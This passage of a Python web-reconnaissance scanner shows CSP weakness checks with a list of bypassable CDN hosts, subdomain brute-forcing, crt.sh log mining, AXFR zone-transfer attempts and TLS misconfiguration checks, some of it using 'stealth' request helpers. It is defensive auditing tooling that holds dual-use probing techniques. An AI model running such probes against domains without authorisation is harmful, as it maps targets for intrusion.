            "detail":   "No fallback directive — browser allows inline scripts and arbitrary sources"
        })

    # ── 2. unsafe-inline in script-src or default-src ──────────
    # Allows any inline <script> tag to execute — directly enables XSS.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "'unsafe-inline'" in val or "unsafe-inline" in val:
            issues.append({
                "severity": "HIGH",
                "issue":    f"'unsafe-inline' in {directive}",
                "detail":   "Inline scripts permitted — any XSS payload executes without restriction"
            })
            break  # Only report once

    # ── 3. Wildcard (*) in script-src or default-src ───────────
    # Allows scripts from any origin — CSP provides no protection.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        tokens = val.split()
        if "*" in tokens or "'*'" in tokens:
            issues.append({
                "severity": "HIGH",
                "issue":    f"Wildcard '*' in {directive}",
                "detail":   "Scripts from any domain are permitted — policy provides no origin restriction"
            })
            break

    # ── 4. unsafe-eval in script-src or default-src ────────────
    # Allows eval(), setTimeout(string), Function() constructor —
    # common XSS escalation vectors even without inline scripts.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "'unsafe-eval'" in val or "unsafe-eval" in val:
            issues.append({
                "severity": "MEDIUM",
                "issue":    f"'unsafe-eval' in {directive}",
                "detail":   "eval() and dynamic code execution permitted — enables script injection via eval-based sinks"
            })
            break

    # ── 5. data: URI in script-src ─────────────────────────────
    # Allows scripts as base64-encoded data: URIs — XSS bypass.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "data:" in val.split():
            issues.append({
                "severity": "HIGH",
                "issue":    f"'data:' URI scheme in {directive}",
                "detail":   "Scripts can be loaded as base64 data: URIs — common CSP bypass technique"
            })
            break

    # ── 6. Overly broad script-src hosts ───────────────────────
    # CDN domains that host user content or JSONP endpoints are
    # well-known CSP bypass vectors.
    BYPASS_HOSTS = [
        "*.googleapis.com", "ajax.googleapis.com",
        "*.cloudflare.com", "cdnjs.cloudflare.com",
        "*.jsdelivr.net", "cdn.jsdelivr.net",
        "*.unpkg.com", "unpkg.com",
        "*.github.io",  # user-controlled content
        "*.s3.amazonaws.com",
        "*.blob.core.windows.net",
    ]
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        for bypass in BYPASS_HOSTS:
            if bypass.lower() in val or bypass.lower().lstrip("*.") in val:
                issues.append({
                    "severity": "MEDIUM",
                    "issue":    f"Bypassable CDN host in {directive}: {bypass}",
                    "detail":   f"{bypass} hosts user-controllable content or JSONP — allows CSP bypass"
                })

    # ── 7. Missing frame-ancestors ─────────────────────────────
    # Without frame-ancestors, X-Frame-Options is the only clickjacking
    # protection. CSP frame-ancestors supersedes XFO in modern browsers.
    if "frame-ancestors" not in directives:
        issues.append({
            "severity": "MEDIUM",
            "issue":    "Missing frame-ancestors directive",
            "detail":   "No CSP clickjacking protection — relies solely on X-Frame-Options if present"
        })

    # ── 8. report-uri / report-to absence ──────────────────────
    # Not a vulnerability, just informational — skip alerting.

    if not issues:
        print(timestamp() + f" CSP OK on {domain}")
        return

    # Collate all issues into one alert per domain
    high_issues   = [i for i in issues if i["severity"] == "HIGH"]
    medium_issues = [i for i in issues if i["severity"] == "MEDIUM"]
    severity      = "HIGH" if high_issues else "MEDIUM"

    all_details = "; ".join(
        f"[{i['severity']}] {i['issue']}: {i['detail']}"
        for i in issues
    )

    alert(
        "WEAK CONTENT SECURITY POLICY",
        severity,
        domain,
        f"{len(issues)} CSP weakness(es) found — {all_details[:400]}"
    )
    print(timestamp() + f" CSP weaknesses [{severity}] on {domain}: "
          + ", ".join(i["issue"] for i in issues))

# ─────────────────────────────────────────────
# Subdomain enumeration
# ─────────────────────────────────────────────

# Track which root domains we've already enumerated to avoid repeating
_enumerated_roots = set()

def detect_wildcard(root_domain):
    """
    Probe two independently random subdomains that cannot possibly exist.
    If both resolve, wildcard DNS is confirmed. Returns a set of wildcard
    IPs (handles round-robin wildcards that rotate between addresses).
    Returns empty set if no wildcard.
    """
    import uuid
    wildcard_ips = set()
    for _ in range(2):
        random_sub = uuid.uuid4().hex[:12] + "." + root_domain
        try:
            ip = socket.gethostbyname(random_sub)
            wildcard_ips.add(ip)
        except socket.gaierror:
            # At least one random subdomain didn't resolve — no wildcard
            return set()
    if wildcard_ips:
        print(timestamp() + " Wildcard DNS detected for " + root_domain + " -> " + str(wildcard_ips))
    return wildcard_ips

def enumerate_subdomains(domain):
    """
    Try DNS resolution for common subdomains of the root domain.
    Detects wildcard DNS first to avoid false positives.
    Saves confirmed live subdomains to Subdomains table.
    """
    root = extract_root_domain(domain)
    if root in _enumerated_roots:
        return
    _enumerated_roots.add(root)

    # Wildcard check - if random subdomains resolve, the host answers
    # everything. We still enumerate but filter results matching any
    # wildcard IP so genuine subdomains on different IPs survive.
    wildcard_ips = detect_wildcard(root)
    if wildcard_ips:
        print(timestamp() + " Wildcard active on " + root + " -- filtering IPs: " + str(wildcard_ips))

    print(timestamp() + " Subdomain enumeration for " + root + " (" + str(len(SUBDOMAIN_WORDLIST)) + " probes)...")
    found_lock = threading.Lock()
    found = [0]

    def _probe_sub(sub):
        fqdn = sub + "." + root
        try:
            ip = socket.gethostbyname(fqdn)

            # Skip if IP matches any known wildcard IP
            if wildcard_ips and ip in wildcard_ips:
                return

            # Verify it's actually responding over HTTP/HTTPS
            resp = safe_get("https://" + fqdn, timeout=4, method="head")
            if not resp:
                resp = safe_get("http://" + fqdn, timeout=4, method="head")
            status = resp.status_code if resp else None

            # Secondary wildcard guard: CDNs like Cloudflare resolve wildcard
            # DNS to a shared IP AND return HTTP 200 for every hit. Even after
            # IP-level filtering above, double-check: if wildcard_ips is set
            # and this IP is in it, this is a catch-all response — not a real
            # service. Skip alert and takeover check.
            if wildcard_ips and ip in wildcard_ips:
                return

            print(timestamp() + " " + _c("Subdomain found:", Fore.GREEN) + " " + fqdn + " -> " + ip + (" [" + str(status) + "]" if status else ""))
            write_to_subdomains_database(root, fqdn, ip, status)
            _subdomain_enriched.add(fqdn)
            with found_lock:
                found[0] += 1

            label = sub.lower()
            if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                _alert_high_value_subdomain(fqdn, label, ip, status)

            # Subdomain takeover check on every confirmed live subdomain
            check_subdomain_takeover(fqdn)
        except (socket.gaierror, socket.timeout):
            pass   # doesn't resolve - expected for most
        except Exception as e:
            print_error("subdomain probe error for " + fqdn + ": " + str(e))

    from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
    with ThreadPoolExecutor(max_workers=20) as _ex:
        _futs = [_ex.submit(_probe_sub, sub) for sub in SUBDOMAIN_WORDLIST]
        for _f in _as_completed(_futs):
            pass

    print(timestamp() + " Subdomain enumeration complete for " + root + " -- " + str(found[0]) + " found.")

# ─────────────────────────────────────────────
# Certificate Transparency log mining
# ─────────────────────────────────────────────

_ct_queried          = set()
_subdomain_enriched  = set()   # tracks FQDNs enriched by any subdomain path (wordlist or CT)

def query_ct_logs(domain):
    """
    Query Certificate Transparency logs via crt.sh for subdomain discovery.
    Finds subdomains that wordlist enumeration misses — historical certs,
    wildcard certs, and subdomains with unusual names are all captured.
    Deduplicates against existing wordlist results via _enumerated_roots.
    """
    root = extract_root_domain(domain)
    if root in _ct_queried:
        return
    _ct_queried.add(root)

    print(timestamp() + " CT log query for " + root + " (crt.sh)...")
    try:
        stealth_delay("crt.sh")
        resp = _get_session().get(
            "https://crt.sh/",
            params={"q": f"%.{root}", "output": "json"},
            headers=stealth_headers({"Accept": "application/json"}),
            timeout=20,
        )
        if resp.status_code != 200:
            print_error(f"crt.sh returned {resp.status_code} for {root}")
            return
        entries = resp.json()
    except Exception as e:
        print_error(f"CT log query failed for {root}: {e}")
        return

    # Extract unique FQDNs from the name_value field (may contain SANs, one per line)
    found = set()
    for entry in entries:
        for name in entry.get("name_value", "").splitlines():
            name = name.strip().lstrip("*.")
            if name and name != root and name.endswith("." + root):
                found.add(name)

    if not found:
        print(timestamp() + " CT logs: no additional subdomains found for " + root)
        return

    print(timestamp() + f" CT logs: {len(found)} unique subdomains from crt.sh for {root} — verifying...")

    wildcard_ips = detect_wildcard(root)
    confirmed = 0

    for fqdn in sorted(found):
        try:
            ip = socket.gethostbyname(fqdn)

            if wildcard_ips and ip in wildcard_ips:
                continue

            resp_h = safe_get("https://" + fqdn, timeout=4, method="head")
            if not resp_h:
                resp_h = safe_get("http://" + fqdn, timeout=4, method="head")
            status = resp_h.status_code if resp_h else None

            # Second wildcard guard after HTTP probe
            if wildcard_ips and ip in wildcard_ips:
                continue

            print(timestamp() + " " + _c("CT subdomain live:", Fore.GREEN) + " " + fqdn + " -> " + ip
                  + (" [" + str(status) + "]" if status else ""))
            write_to_subdomains_database(root, fqdn, ip, status)
            confirmed += 1

            label = fqdn.split(".")[0].lower()
            if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                _alert_high_value_subdomain(fqdn, label, ip, status, source="CT logs")

            check_subdomain_takeover(fqdn)

            # Enrich confirmed live CT subdomains — only if not already found
            # by the wordlist brute-force path to avoid duplicate enrichment.
            if fqdn not in _subdomain_enriched:
                _subdomain_enriched.add(fqdn)
                enrich_domain("https://" + fqdn)

        except (socket.gaierror, socket.timeout):
            pass
        except Exception as e:
            print_error(f"CT subdomain probe error for {fqdn}: {e}")

    print(timestamp() + f" CT log enumeration complete for {root} — {confirmed} live subdomains confirmed.")

# ─────────────────────────────────────────────
# Technology fingerprinting
# ─────────────────────────────────────────────

def fingerprint_technologies(url, response_headers, html_content):
    detected = []
    try:
        headers_lc = {k.lower(): str(v).lower() for k, v in response_headers.items()} if hasattr(response_headers, 'items') else {}
        html_str = html_content.decode("utf-8", errors="ignore").lower() if isinstance(html_content, bytes) else str(html_content).lower()
        for tech, sigs in TECH_SIGNATURES.items():
            found = False
            for h in sigs["headers"]:
                if ": " in h:
                    hname, hval = h.split(": ", 1)
                    if hval.lower() in headers_lc.get(hname.lower(), ""):
                        found = True
                        break
                else:
                    if h.lower() in headers_lc:
                        found = True
                        break
            if not found:
                found = any(p.lower() in html_str for p in sigs["html"])
            if found:
                detected.append(tech)
        if detected:
            print(timestamp() + " Technologies on " + url + ": " + ", ".join(detected))
            for tech in detected:
                write_to_tech_database(url, tech)
    except Exception as e:
        print_error("fingerprint: " + str(e))
    return detected

# ─────────────────────────────────────────────
# Robots.txt
# ─────────────────────────────────────────────

def fetch_robots_txt(base_url):
    robots_url = urljoin(base_url, "/robots.txt")
    try:
        resp = safe_get(robots_url, timeout=REQUEST_TIMEOUT)
        if resp and resp.status_code == 200:
            content = resp.text
            print(timestamp() + " robots.txt found for " + base_url)
            write_to_robots_database(base_url, content)
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.parse(content.splitlines())
            return rp
        else:
            print(timestamp() + " No robots.txt for " + base_url)
    except Exception as e:
        print_error("robots.txt fetch failed for " + base_url + ": " + str(e))
    return None

def is_allowed_by_robots(rp, url):
    if rp is None:
        return True
    try:
        return rp.can_fetch("*", url)
    except Exception:
        return True

# ─────────────────────────────────────────────
# Sitemap.xml
# ─────────────────────────────────────────────

def fetch_sitemap(base_url):
    urls_found = []
    sitemap_url = urljoin(base_url, "/sitemap.xml")
    try:
        resp = safe_get(sitemap_url, timeout=REQUEST_TIMEOUT)
        if resp and resp.status_code == 200:
            soup = BeautifulSoup(resp.content, "xml")
            locs = soup.find_all("loc")
            total = len(locs)
            for loc in locs[:SITEMAP_CAP]:
                u = loc.text.strip()
                urls_found.append(u)
                write_to_sitemap_database(base_url, u)
            if total > SITEMAP_CAP:
                print(timestamp() + " Sitemap has " + str(total) + " URLs — capped at " + str(SITEMAP_CAP))
            else:
                print(timestamp() + " Sitemap found " + str(total) + " URLs for " + base_url)
        else:
            print(timestamp() + " No sitemap.xml for " + base_url)
    except Exception as e:
        print_error("Sitemap fetch failed: " + str(e))
    return urls_found

# ─────────────────────────────────────────────
# DNS
# ─────────────────────────────────────────────

def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            ip = ipval.to_text()
            print(timestamp() + " DNS " + domain + " → " + ip)
            write_to_dns_database(domain, ip)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers) as e:
        print_error("DNS lookup failed for " + domain + ": " + str(e))

def mx_lookup(domain):
    try:
        records = dns.resolver.resolve(domain, 'MX')
        for record in records:
            mx_host = str(record.exchange).rstrip('.')
            preference = record.preference
            print(timestamp() + " MX " + domain + " → " + mx_host + " (pri " + str(preference) + ")")
            write_to_mx_database(domain, mx_host, preference)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers) as e:
        print_error("MX lookup failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# DNS zone transfer (AXFR)
# ─────────────────────────────────────────────

import dns.zone
import dns.query

_zone_transfer_checked = set()

def attempt_zone_transfer(domain):
    """
    Attempt a DNS zone transfer (AXFR) against every authoritative nameserver
    for the root domain.

    A successful AXFR dumps the entire DNS zone — every subdomain, internal
    host, and IP address — in a single query. Misconfigured nameservers that
    allow this are a CRITICAL finding.

    On success, all discovered A/CNAME hostnames are fed back into the
    subdomain enumeration pipeline for liveness checking and enrichment.

    REFUSED responses and timeouts are skipped silently — this is expected
    behaviour for correctly configured nameservers.
    """
    root = extract_root_domain(domain)
    if root in _zone_transfer_checked:
        return
    _zone_transfer_checked.add(root)

    try:
        ns_records  = dns.resolver.resolve(root, 'NS')
        nameservers = [str(r.target).rstrip('.') for r in ns_records]
    except Exception as e:
        print_error(f"NS lookup failed for {root}: {e}")
        return

    print(timestamp() + f" Zone transfer attempt for {root} ({len(nameservers)} nameservers)...")

    for ns in nameservers:
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns, root, timeout=5, lifetime=5))

            # ── Enumerate all records ──────────────────────────────
            records   = []
            hostnames = []   # FQDNs with A or CNAME records for pipeline feeding
            for name, node in zone.nodes.items():
                for rdataset in node.rdatasets:
                    rdtype     = dns.rdatatype.to_text(rdataset.rdtype)
                    name_str   = str(name)
                    fqdn       = root if name_str in ("@", "") else f"{name_str}.{root}"
                    for rdata in rdataset:
                        record_str = f"{fqdn} {rdtype} {rdata}"
                        records.append(record_str)
                        write_to_zone_transfer_database(root, ns, record_str)
                    if rdtype in ("A", "CNAME") and fqdn != root:
                        hostnames.append(fqdn)

            # Sample up to 8 hostnames for the alert detail
            sample = hostnames[:8]
            sample_str = ", ".join(sample) + ("…" if len(hostnames) > 8 else "")

            alert(
                "DNS ZONE TRANSFER ALLOWED (AXFR)",
                "CRITICAL",
                root,
                f"Nameserver {ns} allowed AXFR — {len(records)} records exposed, "
                f"{len(hostnames)} hostnames: {sample_str}. "
                f"Full DNS zone is publicly downloadable."
            )
            print(timestamp() + f" [!!] Zone transfer succeeded: {ns} → "
                                f"{len(records)} records, {len(hostnames)} hostnames for {root}")

            # ── Feed hostnames into the subdomain pipeline ─────────
            wildcard_ips = detect_wildcard(root)
            for fqdn in hostnames:
                if fqdn in _subdomain_enriched:
                    continue
                try:
                    ip = socket.gethostbyname(fqdn)
                    if wildcard_ips and ip in wildcard_ips:
                        continue
                    resp_h = safe_get("https://" + fqdn, timeout=4, method="head")
                    if not resp_h:
                        resp_h = safe_get("http://" + fqdn, timeout=4, method="head")
                    status = resp_h.status_code if resp_h else None
                    if wildcard_ips and ip in wildcard_ips:
                        continue

                    print(timestamp() + f" AXFR subdomain live: {fqdn} -> {ip}"
                                        + (f" [{status}]" if status else ""))
                    write_to_subdomains_database(root, fqdn, ip, status)
                    _subdomain_enriched.add(fqdn)

                    label = fqdn.split(".")[0].lower()
                    if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                        _alert_high_value_subdomain(fqdn, label, ip, status,
                                                     source="zone transfer")
                    check_subdomain_takeover(fqdn)
                    enrich_domain("https://" + fqdn)

                except (socket.gaierror, socket.timeout):
                    pass
                except Exception as e:
                    print_error(f"AXFR subdomain probe error for {fqdn}: {e}")

            return  # One success is definitive — stop probing other NSes

        except (dns.exception.FormError, dns.exception.Timeout,
                EOFError, ConnectionResetError, OSError):
            # REFUSED or timeout — expected for correctly configured servers, skip silently
            pass
        except Exception as e:
            err_str = str(e).lower()
            if any(w in err_str for w in ("refused", "timeout", "timed out")):
                pass  # silently skip
            else:
                print_error(f"Zone transfer probe failed for {root} via {ns}: {e}")

def write_to_zone_transfer_database(root_domain, nameserver, record):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ZoneTransfer")
        conn.execute(
            "INSERT INTO ZoneTransfer (root_domain,nameserver,record,found_at) VALUES (?,?,?,?)",
            (root_domain, nameserver, record, timestamp()))
    except Exception as e:
        print_error("write_to_zone_transfer_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# SSL
# ─────────────────────────────────────────────

try:
    from cryptography import x509 as _x509
    from cryptography.hazmat.backends import default_backend as _crypto_backend
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False

# sslyze is optional — provides deep TLS protocol + cipher suite analysis.
# Falls back to Python's ssl module when not installed.
try:
    from sslyze import (
        Scanner              as _SslyzeScanner,
        ServerNetworkLocation as _SslyzeLocation,
        ServerScanRequest    as _SslyzeScanRequest,
        ScanCommand          as _SslyzeCmd,
    )
    _SSLYZE_AVAILABLE = True
except ImportError:
    _SSLYZE_AVAILABLE = False

def get_ssl_info(domain):
    try:
        from datetime import timezone
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert        = ssock.getpeercert()
                issuer      = dict(x[0] for x in cert.get('issuer', []))
                subject     = dict(x[0] for x in cert.get('subject', []))
                issuer_name = issuer.get('organizationName', 'Unknown')
                common_name = subject.get('commonName', 'Unknown')
                not_before  = cert.get('notBefore', 'Unknown')
                not_after   = cert.get('notAfter', 'Unknown')
                print(timestamp() + " SSL " + domain + " expires " + not_after)
                write_to_ssl_database(domain, common_name, issuer_name, not_before, not_after)

                # ── Expiry check ──────────────────────────────────────
                if not_after and not_after != 'Unknown':
                    try:
                        expiry_dt = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                        days_left = (expiry_dt - datetime.now(timezone.utc)).days
                        if days_left < 0:
                            alert(
                                "SSL CERTIFICATE EXPIRED",
                                "CRITICAL",
                                domain,
                                f"Certificate expired {abs(days_left)} days ago ({not_after})"
                            )
                        elif days_left <= 14:
                            alert(
                                "SSL CERTIFICATE EXPIRING SOON",
                                "HIGH",
                                domain,
                                f"Certificate expires in {days_left} days ({not_after})"
                            )
                    except Exception:
                        pass

                # ── Self-signed check ─────────────────────────────────
                # Self-signed: issuer CN/O matches subject CN/O
                issuer_cn = issuer.get('commonName', '')
                subject_cn = subject.get('commonName', '')
                issuer_org = issuer.get('organizationName', '')
                subject_org = subject.get('organizationName', '')
                if issuer_cn and issuer_cn == subject_cn:
                    alert(
                        "SELF-SIGNED SSL CERTIFICATE",
                        "HIGH",
                        domain,
                        f"Certificate is self-signed (issuer CN = subject CN = '{issuer_cn}'). "
                        f"Clients cannot verify authenticity."
                    )
                elif issuer_org and issuer_org == subject_org and issuer_org not in ('', 'Unknown'):
                    alert(
                        "SELF-SIGNED SSL CERTIFICATE",
                        "HIGH",
                        domain,
                        f"Certificate appears self-signed (issuer org = subject org = '{issuer_org}')."
                    )

                # ── Deep analysis via cryptography library ────────────
                if _CRYPTO_AVAILABLE:
                    try:
                        raw_cert = ssock.getpeercert(binary_form=True)
                        cert_obj = _x509.load_der_x509_certificate(raw_cert, _crypto_backend())

                        # Signature algorithm — flag SHA1/MD5 as weak
                        sig_alg = cert_obj.signature_hash_algorithm
                        if sig_alg:
                            alg_name = sig_alg.name.lower()
                            if alg_name in ("sha1", "md5", "md2"):
                                alert(
                                    f"WEAK SSL SIGNATURE ALGORITHM: {alg_name.upper()}",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses deprecated {alg_name.upper()} signature algorithm. "
                                    f"Vulnerable to collision attacks."
                                )

                        # Public key size — flag RSA/DSA < 2048, EC < 224
                        pub_key = cert_obj.public_key()
                        key_type = type(pub_key).__name__
                        key_size = getattr(pub_key, 'key_size', None)
                        if key_size:
                            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa, dsa as _dsa, ec as _ec
                            if isinstance(pub_key, (_rsa.RSAPublicKey, _dsa.DSAPublicKey)) and key_size < 2048:
                                alert(
                                    f"WEAK SSL KEY SIZE: {key_size}-bit {key_type}",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses {key_size}-bit key — below recommended 2048-bit minimum."
                                )
                            elif isinstance(pub_key, _ec.EllipticCurvePublicKey) and key_size < 224:
                                alert(
                                    f"WEAK SSL KEY SIZE: {key_size}-bit EC",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses {key_size}-bit elliptic curve key — below recommended 224-bit minimum."
                                )

                        # Subject Alternative Names
                        try:
                            san_ext = cert_obj.extensions.get_extension_for_class(_x509.SubjectAlternativeName)
                            san_names = [str(n.value) for n in san_ext.value]
                            wildcard_sans = [s for s in san_names if s.startswith("*.")]
                            if wildcard_sans:
                                print(timestamp() + f" SSL wildcard SANs on {domain}: {', '.join(wildcard_sans)}")
                            print(timestamp() + f" SSL SANs ({len(san_names)}): {', '.join(san_names[:10])}"
                                  + (" ..." if len(san_names) > 10 else ""))
                        except Exception:
                            pass

                    except Exception as e:
                        print_error(f"SSL deep analysis failed for {domain}: {e}")

    except (ssl.SSLError, socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as e:
        print_error("SSL failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# TLS/SSL misconfiguration detection
# ─────────────────────────────────────────────

_tls_checked: set = set()

# Cipher name substrings → (severity, human label)
_WEAK_CIPHER_PATTERNS = [
    ("NULL",   "CRITICAL", "NULL cipher — no encryption"),
    ("EXPORT", "CRITICAL", "EXPORT cipher — FREAK vulnerability"),
    ("ANULL",  "CRITICAL", "anonymous cipher — no server authentication"),
    ("RC4",    "HIGH",     "RC4 cipher — broken encryption"),
    ("_DES",   "HIGH",     "DES cipher — SWEET32 vulnerability"),
    ("3DES",   "HIGH",     "3DES cipher — SWEET32 vulnerability"),
    ("_MD5",   "HIGH",     "MD5 MAC cipher"),
]

# Legacy versions testable via ssl.TLSVersion: (attr, severity, label, detail)
_LEGACY_TLS_VERSIONS = [
    ("SSLv3",   "HIGH",   "SSL 3.0",
     "POODLE vulnerability — padding oracle attack allows decryption of HTTPS"),
    ("TLSv1",   "MEDIUM", "TLS 1.0",
     "Deprecated since RFC 8996 (2021); vulnerable to BEAST and POODLE-over-TLS"),
    ("TLSv1_1", "MEDIUM", "TLS 1.1",
     "Deprecated since RFC 8996 (2021); lacks AEAD cipher suite support"),
]

_HSTS_MIN_MAX_AGE    = 180 * 86400   # 180 days in seconds
_CERT_EXPIRY_WARN_DAYS = 30          # flag LOW if cert expires within this many days


def _test_legacy_tls_version(host: str, port: int, version_attr: str,
                             timeout: int = 10) -> bool:
    """Return True if the server accepts the named legacy TLS version."""
    tls_ver = getattr(ssl.TLSVersion, version_attr, None)
    if tls_ver is None:
        return False   # version not supported by this Python/OpenSSL build
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        ctx.minimum_version = tls_ver
        ctx.maximum_version = tls_ver
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host):
                return True
    except (ssl.SSLError, OSError, socket.timeout):
        return False
    except Exception:
        return False


def _get_negotiated_cipher(host: str, port: int, timeout: int = 10) -> str:
    """Return the name of the cipher negotiated by default, or empty string."""
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                c = ssock.cipher()
                return c[0] if c else ""
    except Exception:
        return ""


def _check_hsts_header(domain: str, hsts_value) -> None:
    """Validate a Strict-Transport-Security header value.
    Skips the 'missing' case — that is already raised by check_security_headers."""
    if not hsts_value:
        return
    parts      = [d.strip().lower() for d in hsts_value.split(";")]
    directives = set(parts)
    max_age    = None
    for d in parts:
        if d.startswith("max-age="):
            try:
                max_age = int(d.split("=", 1)[1])
            except ValueError:
                pass

    if max_age is not None and max_age < _HSTS_MIN_MAX_AGE:
        alert(
            "HSTS MAX-AGE TOO SHORT",
            "LOW",
            domain,
            f"HSTS max-age={max_age}s ({max_age // 86400} days) is below the "
            f"recommended minimum of {_HSTS_MIN_MAX_AGE // 86400} days — "
            f"allows downgrade window after first visit",
        )
    if "includesubdomains" not in directives:
        alert(
            "HSTS MISSING INCLUDESUBDOMAINS",
            "LOW",
            domain,
            "Strict-Transport-Security lacks 'includeSubDomains' — "
            "subdomains can still be reached over plain HTTP",
        )
    if "preload" not in directives:
        alert(
            "HSTS MISSING PRELOAD",
            "INFO",
            domain,
            "Strict-Transport-Security lacks 'preload' — site is not eligible "
            "for browser HSTS preload list",
        )


def _check_cert_obj_tls(domain: str, cert_obj) -> None:
    """Check a cryptography cert object: 30-day expiry and weak signature algorithm."""
    if not _CRYPTO_AVAILABLE or cert_obj is None:
        return
    from datetime import timezone
    try:
        # cryptography >= 42 exposes not_valid_after_utc; older uses not_valid_after
        try:
            exp = cert_obj.not_valid_after_utc
        except AttributeError:
            exp = cert_obj.not_valid_after.replace(tzinfo=timezone.utc)
        days = (exp - datetime.now(timezone.utc)).days
        if 0 < days <= _CERT_EXPIRY_WARN_DAYS:
            alert(
                "TLS CERTIFICATE EXPIRING SOON",
                "LOW",
                domain,
                f"Certificate expires in {days} day(s) — renew before expiry to avoid outage",
            )
        sig_name = getattr(
            getattr(cert_obj, "signature_hash_algorithm", None), "name", ""
        ).lower()
        if sig_name in ("md5", "sha1", "md2"):
            alert(
                f"WEAK TLS SIGNATURE ALGORITHM: {sig_name.upper()}",
                "MEDIUM",
                domain,
                f"Certificate uses deprecated {sig_name.upper()} signature algorithm — "
                f"vulnerable to collision attacks",
            )
    except Exception:
        pass


def _check_cert_ct(domain: str, cert_obj) -> None:
    """Alert if the certificate has no embedded SCT (Certificate Transparency)."""
    if not _CRYPTO_AVAILABLE or cert_obj is None:
        return
    try:
        ct_oids = (
            _x509.oid.ExtensionOID.PRECERT_SIGNED_CERTIFICATE_TIMESTAMPS,
            _x509.oid.ExtensionOID.SIGNED_CERTIFICATE_TIMESTAMPS,
        )
        for oid in ct_oids:
            try:
                cert_obj.extensions.get_extension_for_oid(oid)
                return   # SCT present — CT satisfied
            except _x509.ExtensionNotFound:
                pass
        alert(
            "CERTIFICATE TRANSPARENCY NOT LOGGED",
            "LOW",
            domain,
            "Certificate contains no embedded SCT (Signed Certificate Timestamps) — "
            "may not be logged in public CT logs; modern browsers may reject it",
        )
    except Exception:
        pass


def _check_tls_sslyze(host: str, port: int, domain: str) -> None:
    """Deep TLS analysis using sslyze: protocol versions, cipher suites, cert, HSTS."""
    try:
        server_location = _SslyzeLocation(hostname=host, port=port)
        scan_request    = _SslyzeScanRequest(
            server_location=server_location,
            scan_commands={
                _SslyzeCmd.SSL_2_0_CIPHER_SUITES,
                _SslyzeCmd.SSL_3_0_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_0_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_1_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_2_CIPHER_SUITES,
                _SslyzeCmd.TLS_1_3_CIPHER_SUITES,
                _SslyzeCmd.CERTIFICATE_INFO,
                _SslyzeCmd.HTTP_HEADERS,
            },
        )
        scanner = _SslyzeScanner()
        scanner.queue_scans([scan_request])

        for server_result in scanner.get_results():
            if server_result.scan_result is None:
                continue
            sr = server_result.scan_result

            # ── Protocol version checks ───────────────────────────────────
            proto_checks = [
                ("ssl_2_0_cipher_suites", "SSL 2.0", "CRITICAL",
                 "SSL 2.0 accepted — severely broken; no secure cipher modes exist"),
                ("ssl_3_0_cipher_suites", "SSL 3.0", "HIGH",
                 "SSL 3.0 accepted — POODLE vulnerability allows CBC padding oracle attack"),
                ("tls_1_0_cipher_suites", "TLS 1.0", "MEDIUM",
                 "TLS 1.0 accepted — deprecated since RFC 8996; vulnerable to BEAST/POODLE-over-TLS"),
                ("tls_1_1_cipher_suites", "TLS 1.1", "MEDIUM",
                 "TLS 1.1 accepted — deprecated since RFC 8996; lacks AEAD cipher support"),
            ]
            for attr, label, severity, detail in proto_checks:
                res = getattr(sr, attr, None)
                if res and getattr(res, "accepted_cipher_suites", []):
                    n = len(res.accepted_cipher_suites)
                    alert(
                        f"DEPRECATED TLS PROTOCOL: {label}",
                        severity,
                        domain,
                        f"{detail} ({n} cipher suite(s) accepted)",
                    )

            # ── Weak cipher suites (TLS 1.2 and 1.3 buckets) ─────────────
            for attr in ("tls_1_2_cipher_suites", "tls_1_3_cipher_suites"):
                res = getattr(sr, attr, None)
                if not res:
                    continue
                for cs in getattr(res, "accepted_cipher_suites", []):
                    name = cs.cipher_suite.name.upper()
                    for pattern, sev, label in _WEAK_CIPHER_PATTERNS:
                        if pattern in name:
                            alert(
                                f"WEAK CIPHER SUITE: {pattern}",
                                sev,
                                domain,
                                f"Server accepts weak cipher {name!r} ({label})",
                            )
                            break

            # ── Certificate validation ────────────────────────────────────
            cert_info = getattr(sr, "certificate_info", None)
            if cert_info:
                for deployment in getattr(cert_info, "certificate_deployments", []):
                    chain = getattr(deployment, "received_certificate_chain", [])
                    if not chain:
                        continue
